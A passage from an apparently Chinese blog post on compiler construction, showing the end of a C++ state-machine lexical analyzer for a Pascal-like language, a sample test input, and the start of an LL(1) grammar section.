 <span class="comment">// 状态转移-&gt;19 科学计数法  允许有: 3.e7 的写法</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">19</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 截取实数</span></span><br><span class="line">                            type = <span class="number">2</span>;</span><br><span class="line">                            cag = <span class="number">42</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; </span><br><span class="line">                    <span class="keyword">case</span> <span class="number">19</span>:&#123;   <span class="comment">// 科学计数法e 不可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;+&#x27;</span> || wd == <span class="string">&#x27;-&#x27;</span>)&#123;     <span class="comment">// 状态转移-&gt;25 科学计数法+-</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">25</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isNumber</span>())&#123;      <span class="comment">// 状态转移-&gt;26 十进制整数后终态</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">26</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 出错啦</span></span><br><span class="line">                            i = <span class="built_in">passError</span>(i);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">20</span>:&#123;   <span class="comment">// 十六进制x 不可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">16</span>))&#123;   <span class="comment">// 状态转移-&gt;27 十六进制整数后终态</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">27</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            i = <span class="built_in">passError</span>(i);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">21</span>:&#123;   <span class="comment">// 二进制数b 不可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">2</span>))&#123;    <span class="comment">// 状态转移-&gt;28 二进制数后终态</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">28</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            i = <span class="built_in">passError</span>(i);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">22</span>:&#123;   <span class="comment">// 八进制数中态 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">8</span>))&#123;    <span class="comment">// 原地踏步</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">22</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;e&#x27;</span> || wd == <span class="string">&#x27;E&#x27;</span>)&#123;  <span class="comment">// 状态转移-&gt;19 科学计数法e</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">19</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;.&#x27;</span>)&#123;   <span class="comment">// 状态转移-&gt;18 当做十进制数处理的八进制小数(C++中自适应)</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">18</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            type = <span class="number">2</span>;</span><br><span class="line">                            cag = <span class="number">41</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">23</span>:&#123;   <span class="comment">// 单行注释符// 条件终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;\n&#x27;</span>)&#123;   <span class="comment">// 截取单行注释串</span></span><br><span class="line">                            type = <span class="number">5</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 原地踏步</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">23</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">24</span>:&#123;   <span class="comment">// 多行注释符/* 不可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;*&#x27;</span>)&#123;  <span class="comment">// 状态转移-&gt;29 检测退出记号*/</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">29</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 原地踏步</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">24</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">25</span>:&#123;   <span class="comment">// 科学计数法+- 不可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>())&#123;     <span class="comment">// 状态转移-&gt;26 十进制整数后终态</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">26</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            i = <span class="built_in">passError</span>(i);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">26</span>:&#123;   <span class="comment">// 十进制整数后终态 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>())&#123;     <span class="comment">// 原地踏步</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">26</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            type = <span class="number">2</span>;</span><br><span class="line">                            cag = <span class="number">42</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">27</span>:&#123;   <span class="comment">// 十六进制整数后终态 十六进制不接受小数点</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">16</span>))&#123;   <span class="comment">// 原地踏步</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">27</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;e&#x27;</span> || wd == <span class="string">&#x27;E&#x27;</span>)&#123;  <span class="comment">// 状态转移-&gt;19</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">19</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            type = <span class="number">2</span>;</span><br><span class="line">                            cag = <span class="number">41</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">28</span>:&#123;   <span class="comment">// 二进制数后终态</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">2</span>))&#123;</span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">28</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;e&#x27;</span> || wd == <span class="string">&#x27;E&#x27;</span>)&#123;</span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">19</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            type = <span class="number">2</span>;</span><br><span class="line">                            cag = <span class="number">41</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">29</span>:&#123;   <span class="comment">// 检测退出记号 */</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">                            type = <span class="number">5</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125; </span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;*&#x27;</span>)&#123;     <span class="comment">// 原地踏步</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">29</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> &#123;    <span class="comment">// 状态转移-&gt;24</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">24</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(needOF)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;==&gt; The output has been saved to the file: %s&quot;</span>, oFP.<span class="built_in">c_str</span>());   <span class="comment">// 保存文件</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">blankContinue</span><span class="params">()</span></span>&#123;    <span class="comment">// 跳过空白字符，考虑换行对正负加减的影响</span></span><br><span class="line">            <span class="keyword">if</span>(wd == <span class="string">&#x27;\n&#x27;</span>) cag = <span class="number">51</span>;     <span class="comment">// 对于大部分词元而言换行等价于分号 </span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">passError</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;   <span class="comment">// 跳过错误部分，不考虑错误部分引号的性质</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=n; i&lt;srcLen; i++)&#123;</span><br><span class="line">                wd = src[i];</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">isDelimiter</span>() || <span class="built_in">isBlank</span>() || wd == <span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">                    <span class="built_in">outError</span>();</span><br><span class="line">                    <span class="keyword">return</span> i<span class="number">-1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(wd == <span class="string">&#x27;:&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(src[i+<span class="number">1</span>]!=<span class="string">&#x27;=&#x27;</span>)&#123;</span><br><span class="line">                        <span class="built_in">outError</span>();</span><br><span class="line">                        <span class="keyword">return</span> i<span class="number">-1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(wd == <span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(src[i+<span class="number">1</span>]==<span class="string">&#x27;/&#x27;</span> || src[i+<span class="number">1</span>]==<span class="string">&#x27;*&#x27;</span>)&#123;</span><br><span class="line">                        <span class="built_in">outError</span>();</span><br><span class="line">                        <span class="keyword">return</span> i<span class="number">-1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">newStatus</span>(<span class="number">-1</span>);  <span class="comment">// 避免分界符被放入错误输出中</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> srcLen<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">outError</span><span class="params">()</span></span>&#123;     <span class="comment">// 错误报告</span></span><br><span class="line">            <span class="built_in">newPrintf</span>(<span class="string">&quot;Error with: %s\n&quot;</span>, words.<span class="built_in">c_str</span>());</span><br><span class="line">            <span class="built_in">newStatus</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">newStatus</span><span class="params">(<span class="type">int</span> _s)</span></span>&#123;  <span class="comment">// 更新状态</span></span><br><span class="line">            <span class="keyword">switch</span>(_s)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:    <span class="comment">// 为0则初始化状态</span></span><br><span class="line">                    status = <span class="number">0</span>;    <span class="comment">// 原始状态</span></span><br><span class="line">                    len = <span class="number">0</span>;</span><br><span class="line">                    words = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">-1</span>:   <span class="comment">// -1作为一个暂态，处理不需要状态实际转移的情况</span></span><br><span class="line">                    len += <span class="number">1</span>;</span><br><span class="line">                    words += wd;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:    <span class="comment">// 不为0就更新状态</span></span><br><span class="line">                    status = _s;</span><br><span class="line">                    len += <span class="number">1</span>;</span><br><span class="line">                    words += wd;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">output</span><span class="params">()</span></span>&#123;   <span class="comment">// 存储词元、输出、初始化</span></span><br><span class="line">            <span class="keyword">switch</span>(type)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>: <span class="keyword">break</span>;      <span class="comment">// 关键字</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:    <span class="comment">// 运算符</span></span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">20</span>; i&lt;<span class="number">33</span>; i++)</span><br><span class="line">                        <span class="keyword">if</span>(wordsTable[i] == words)&#123;</span><br><span class="line">                            cag = i+<span class="number">1</span>;</span><br><span class="line">                            <span class="keyword">break</span>;  <span class="comment">// 跳出for循环而非case</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    <span class="comment">// 出错啦</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>: <span class="keyword">break</span>;      <span class="comment">// 常数</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:    <span class="comment">// 界符</span></span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">50</span>; i&lt;<span class="number">56</span>; i++)</span><br><span class="line">                        <span class="keyword">if</span>(wordsTable[i] == words)&#123;</span><br><span class="line">                            cag = i+<span class="number">1</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                    <span class="comment">// 出错啦</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">4</span>:    <span class="comment">// 标识符</span></span><br><span class="line">                    cag = <span class="number">45</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">5</span>:     <span class="comment">// 注释 无需输出与存储，初始化后退出</span></span><br><span class="line">                    <span class="built_in">newStatus</span>(<span class="number">0</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            wordsLen += <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">newPrintf</span>(<span class="string">&quot;(%d)(%d,%s)\n&quot;</span>, wordsLen, cag, words.<span class="built_in">c_str</span>());</span><br><span class="line">            strV.<span class="built_in">push_back</span>(words);   <span class="comment">// 存储词元</span></span><br><span class="line">            typeV.<span class="built_in">push_back</span>(cag);   <span class="comment">// 存储词元</span></span><br><span class="line">            <span class="built_in">newStatus</span>(<span class="number">0</span>);   <span class="comment">// 初始化</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">isBlank</span><span class="params">()</span><span class="type">const</span></span>&#123;    <span class="comment">// 检测空白字符</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)</span><br><span class="line">                <span class="keyword">if</span>(filt[i] == wd) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">isDelimiter</span><span class="params">()</span><span class="type">const</span></span>&#123;    <span class="comment">// 判断是否是单字分界符</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)</span><br><span class="line">                <span class="keyword">if</span>(wd == delm[i]) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">isKeywords</span><span class="params">()</span><span class="type">const</span></span>&#123;  <span class="comment">// 判断关键字，返回种别码或0</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;keyWordsLen; i++)</span><br><span class="line">                <span class="keyword">if</span>(words == wordsTable[i]) <span class="keyword">return</span> i+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">isNumber</span><span class="params">(<span class="type">int</span> lim = <span class="number">10</span>)</span><span class="type">const</span></span>&#123;  <span class="comment">// 判断数字</span></span><br><span class="line">            <span class="keyword">switch</span> (lim)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:    <span class="comment">// 除0以外的十进制数字</span></span><br><span class="line">                    <span class="keyword">if</span>(wd &gt;= <span class="string">&#x27;1&#x27;</span> &amp;&amp; wd &lt;= <span class="string">&#x27;9&#x27;</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">10</span>:        <span class="comment">// 十进制</span></span><br><span class="line">                    <span class="keyword">if</span>(wd&gt;=<span class="string">&#x27;0&#x27;</span> &amp;&amp; wd&lt;=<span class="string">&#x27;9&#x27;</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">                    <span class="keyword">if</span>(wd &gt;=<span class="string">&#x27;0&#x27;</span> &amp;&amp; wd&lt;=<span class="string">&#x27;7&#x27;</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                    <span class="keyword">if</span>(wd &gt;=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">                    <span class="keyword">if</span>(wd &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; wd &lt;= <span class="string">&#x27;9&#x27;</span> || wd &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; wd &lt;= <span class="string">&#x27;f&#x27;</span> || wd &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; wd &lt;= <span class="string">&#x27;F&#x27;</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">isLowerLetter</span><span class="params">()</span><span class="type">const</span></span>&#123;  <span class="comment">// 判断大写字母</span></span><br><span class="line">            <span class="keyword">if</span>(wd&gt;=<span class="string">&#x27;a&#x27;</span> &amp;&amp; wd&lt;=<span class="string">&#x27;z&#x27;</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">isUpperLetter</span><span class="params">()</span><span class="type">const</span></span>&#123;  <span class="comment">// 判断大写字母</span></span><br><span class="line">            <span class="keyword">if</span>(wd&gt;=<span class="string">&#x27;A&#x27;</span> &amp;&amp; wd&lt;=<span class="string">&#x27;Z&#x27;</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">printSplit</span><span class="params">(string text)</span></span>&#123;  <span class="comment">// 输出夹带文本的分割线</span></span><br><span class="line">            <span class="type">const</span> <span class="type">int</span> aLen = <span class="number">60</span>;</span><br><span class="line">            <span class="type">int</span> _len = text.<span class="built_in">length</span>()+<span class="number">2</span>; <span class="comment">// 两侧留空</span></span><br><span class="line">            <span class="type">int</span> left = (aLen-_len)/<span class="number">2</span>, right = aLen - left - _len;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;left; i++) <span class="built_in">newPrintf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="built_in">newPrintf</span>(<span class="string">&quot; %s &quot;</span>, text.<span class="built_in">c_str</span>());</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;right; i++) <span class="built_in">newPrintf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="built_in">newPrintf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">newPrintf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *fmt, ...)</span></span>&#123;   <span class="comment">// 重载自己的printf, 便于保存输出的内容, 参考: https://blog.csdn.net/weixin_51281362/article/details/125445742 | https://blog.csdn.net/wanruiou/article/details/115180466</span></span><br><span class="line">            va_list arg;    </span><br><span class="line">            <span class="built_in">va_start</span>(arg, fmt); <span class="comment">// 传入地址</span></span><br><span class="line">            <span class="built_in">vprintf</span>(fmt, arg); </span><br><span class="line">            <span class="keyword">if</span>(needOF)  <span class="comment">// 需要保存至文件</span></span><br><span class="line">                <span class="built_in">vfprintf</span>(oF, fmt, arg); <span class="comment">// 借助FILE将printf重定向至文件流, 参考: https://blog.csdn.net/LuyaoYing001/article/details/79750833</span></span><br><span class="line">            <span class="built_in">va_end</span>(arg);    <span class="comment">// 结束可变参数的获取</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    wordsAnalyzer *wA = <span class="keyword">new</span> <span class="built_in">wordsAnalyzer</span>();</span><br><span class="line">    wA-&gt;<span class="built_in">printSplit</span>(<span class="string">&quot;Lexical Analysis&quot;</span>);</span><br><span class="line">    wA-&gt;<span class="built_in">analyze</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><ul>
<li>若某些功能需要指向一些常做修改的变量，并且在代码中多次出现，则建议将其封装进函数，如此处的 <code>cag-&gt;wordsTable</code> ，这样当”wordsTable”发生变化，cag指向需要修改的时候只需要修改一个函数就能解决。</li>
</ul>
<h3 id="测试源码"><a href="#测试源码" class="headerlink" title="测试源码"></a>测试源码</h3><div class="highlight-container" data-rel="Pascal"><figure class="iseeu highlight pascal"><table><tr><td class="code"><pre><span class="line">++; &gt;=&lt;=:=&lt;&gt;/*sdfsadfasdf23123123sdfsdf*<span class="number">22332376</span>FDD_**/</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">var</span> <span class="number">32</span>asg,&amp;&amp;<span class="number">&amp;3</span>sdf,sdf123:integer; -*/,;,</span><br><span class="line">a=b+c; a++; a=<span class="number">1234</span>; &gt;=  <span class="comment">//sdfsadfasdf23123123sdfsdf;</span></span><br><span class="line">;  , /*sdfsadfasdf23123123sdfsdf*<span class="number">22332376</span>FDD_**/ ;<span class="number">4</span>;,,,,,<span class="comment">//*sdfsaf*22332376FDD_*</span></span><br><span class="line">a=b+c;  /  boolean  <span class="keyword">mod</span>;a <span class="keyword">div</span> b  a&lt;&gt;b  <span class="number">1234.123</span> sdfddsasdfsdf  aaaaasdfsdfsdfsdfsad12123sdfsdfsdfsdf</span><br><span class="line">-<span class="number">5</span> <span class="keyword">if</span> -(<span class="number">5</span>+<span class="number">6</span>)+<span class="number">1</span>e25-<span class="number">0</span>x233a+<span class="number">0316</span>/<span class="number">2.5</span>E7  abc123a <span class="keyword">begin</span>&quot;<span class="number">123</span>++aefb<span class="comment">///*&quot;</span></span><br><span class="line">/* <span class="number">23123</span>dfsdfsdfdf</span><br><span class="line">++++dsfsdf  <span class="keyword">begin</span></span><br><span class="line">*/</span><br></pre></td></tr></table></figure></div>

<h2 id="Grammar-Analysis"><a href="#Grammar-Analysis" class="headerlink" title="Grammar Analysis"></a>Grammar Analysis</h2><h3 id="LL-1-文法"><a href="#LL-1-文法" class="headerlink" title="LL(1)文法"></a>LL(1)文法</h3><p><em>上接Z语言词法分析器</em></p>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li><p>处理产生式集合，消除左递归与左因子部分：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;程序&gt; -&gt; program&lt;标识符&gt;;&lt;分程序&gt;</span><br><span class="line">&lt;分程序&gt; -&gt; &lt;变量说明&gt;begin&lt;语句表&gt;end.</span><br><span class="line">&lt;变量说明&gt; -&gt; var&lt;变量说明表&gt;</span><br><span class="line">&lt;变量说明表&gt; -&gt; &lt;变量表&gt;:&lt;类型&gt;;&lt;后变量说明表&gt;</span><br><span class="line">&lt;后变量说明表&gt; -&gt; &lt;变量说明表&gt; | &lt;空&gt;</span><br><span class="line">&lt;类型&gt; -&gt; integer | real</span><br><span class="line">&lt;变量表&gt; -&gt; &lt;变量&gt;&lt;后变量表&gt;</span><br><span class="line">&lt;后变量表&gt; -&gt; ,&lt;变量表&gt; | &lt;空&gt;</span><br><span class="line">&lt;语句表&gt; -&gt; &lt;语句&gt;&lt;后语句表&gt;</span><br><span class="line">&lt;后语句表&gt; -&gt; ;&lt;语句表&gt; | &lt;空&gt;</span><br><span class="line">&lt;语句&gt; -&gt; &lt;赋值语句&gt; | &lt;条件语句&gt; | &lt;WHILE语句&gt; | &lt;复合语句&gt;</span><br><span class="line">&lt;赋值语句&gt; -&gt; &lt;变量&gt;:=&lt;算术表达式&gt;</span><br><span class="line">&lt;条件语句&gt; -&gt; if&lt;关系表达式&gt;then&lt;语句&gt;else&lt;语句&gt;</span><br><span class="line">&lt;WHILE语句&gt; -&gt; while&lt;关系表达式&gt;do&lt;语句&gt;</span><br><span class="line">&lt;复合语句&gt; -&gt; begin&lt;语句表&gt;end</span><br><span class="line">&lt;算术表达式&gt; -&gt; &lt;项&gt;&lt;替算术表达式&gt;</span><br><span class="line">&lt;替算术表达式&gt; -&gt; &lt;另算术表达式&gt; | &lt;空&gt;</span><br><span class="line">&lt;另算术表达式&gt; -&gt; &lt;后算术表达式&gt;&lt;另算术表达式&gt; | &lt;空&gt;</span><br><span class="line">&lt;后算术表达式&gt; -&gt; +&lt;项&gt; | -&lt;项&gt;</span><br><span class="line">&lt;项&gt; -&gt; &lt;因式&gt;&lt;替项&gt;</span><br><span class="line">&lt;替项&gt; -&gt; &lt;另项&gt; | &lt;空&gt;</span><br><span class="line">&lt;另项&gt; -&gt; &lt;后项&gt;&lt;另项&gt; | &lt;空&gt;</span><br><span class="line">&lt;后项&gt; -&gt; *&lt;因式&gt; | /&lt;因式&gt;</span><br><span class="line">&lt;因式&gt; -&gt; &lt;变量&gt; | &lt;常数&gt; | (&lt;算术表达式&gt;)</span><br><span class="line">&lt;关系表达式&gt; -&gt; &lt;算术表达式&gt;&lt;关系符&gt;&lt;算术表达式&gt;</span><br><span class="line">&lt;变量&gt; -&gt; 